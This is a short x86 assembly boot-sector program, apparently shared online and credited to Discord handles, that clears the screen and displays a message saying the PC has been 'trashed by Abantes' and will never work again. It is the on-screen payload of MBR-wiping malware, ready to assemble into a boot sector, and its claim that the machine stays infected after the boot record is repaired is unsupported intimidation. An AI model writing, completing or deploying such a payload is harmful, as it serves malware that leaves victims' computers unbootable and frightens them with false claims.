;this isn't my code, I'm not good with assembly I got this online

BITS    16
ORG     0x7c00
  
jmp start
  
start:
        call clear_screen
        mov ax,cs
        mov ds,ax
        mov si,msg
         
        call print
  
print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0
        je done
        call printchar
        inc si
        jmp next
done:
        jmp $
  
printchar:
        mov ah,0x0e
        int 0x10
        ret
         
clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x0C        ;look up bios color attributes first digit background second is text
        mov cx, 0x0000
        mov dx, 0x184f
        int 0x10
        ret
   
msg:            db        "YOUR PC HAS BEEN TRASHED BY ABANTES",13,10," ",13,10,"This PC is dead because you didn't follow the rules",13,10,"You're PC will never work again",13,10," ",13,10," ",13,10," ",13,10,"NOTE:",13,10,"Even if you fix the MBR your PC is still infected",13,10," ",13,10,"This was a collaboration check out our discords:",13,10,"Chris#0538 and ElektroKill#8432", 0
times 510 - ($-$$) db 0
dw        0xaa55
